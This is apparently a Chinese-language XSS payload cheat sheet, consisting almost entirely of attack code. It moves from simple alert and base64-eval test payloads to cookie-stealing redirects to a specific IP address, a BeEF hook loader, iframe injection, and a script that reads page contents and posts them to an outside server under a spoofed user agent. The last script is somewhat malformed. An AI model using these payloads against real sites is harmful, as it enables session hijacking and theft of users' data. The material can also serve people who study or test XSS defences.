## xss 检测用 payload

```html
<svg onload="eval('document.cookie')"//

<svg onload=alert(1)

<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
```

## 进阶食用

```html
<svg/onload=location='http://124.222.21.138:10086'>

<svg/onload=location='http://124.222.21.138:10086?cookie='+document.cookie;>

<script src="http://BeEF主机-IP:3000/hook.js"></script> // kali beef-xss test

<svg/onload=location='http://124.222.21.138:10086/hook.js'>

<svg/onload="var iframe = document.createElement('iframe');iframe.src = 'http://192.168.80.128:8888';document.body.appendChild(iframe);">   // 测试能否动态加载 js
```

### UA 外带数据

```html
pages = ['page1'];
var data = {};
var count = 0;

// 请求每个页面的数据
for (var i = 0; i < pages.length; i++) {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', pages[i], true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      // 将页面数据存储到 data 对象中
      data[pages[i]] = xhr.responseText;
      count++;
      if (count === pages.length) {
        // 所有页面数据请求完毕，发送数据到外部 URL
        sendData(data);
      }
    }
  };
  xhr.send();
}

// 发送数据到外部 URL
function sendData(data) {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'http://124.222.21.138:9999', true);
  xhr.setRequestHeader('Content-Type', 'application/json');
var customUserAgent = 'Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; PRO 7-S Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.9.4.974 UWS/2.13.2.46 Mobile Safari/537.36 AliApp(DingTalk/4.6.29) com.alibaba.android.rimet/11388461 Channel/10002068 language/zh-CN';

Object.defineProperty(navigator, 'userAgent', {
  value: customUserAgent,
  writable: false
});

  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var response = xhr.responseText;
      console.log(response);
    }
  };
  xhr.send(JSON.stringify(data));
}
">
```
